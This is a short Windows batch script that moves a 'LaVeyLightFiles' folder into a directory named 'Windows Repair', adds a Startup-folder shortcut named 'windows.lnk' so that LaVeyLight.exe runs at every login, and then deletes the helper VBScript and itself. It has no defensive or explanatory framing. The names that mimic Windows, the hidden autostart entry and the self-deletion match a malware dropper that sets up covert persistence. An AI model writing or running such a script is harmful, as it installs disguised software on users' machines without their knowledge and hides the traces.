SET FOLDER=%HOMEDRIVE%\Windows Repair
RMDIR /s /q "%FOLDER%"
MOVE "%CD%\LaVeyLightFiles" "%FOLDER%"
ECHO Set oWS = WScript.CreateObject("WScript.Shell") > CreateShortcut.vbs
ECHO sLinkFile = "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\windows.lnk" >> CreateShortcut.vbs
ECHO Set oLink = oWS.CreateShortcut(sLinkFile) >> CreateShortcut.vbs
ECHO oLink.TargetPath = "%FOLDER%\LaVeyLight.exe" >> CreateShortcut.vbs
ECHO oLink.Save >> CreateShortcut.vbs
cscript CreateShortcut.vbs
DEL CreateShortcut.vbs
cls
DEL %0
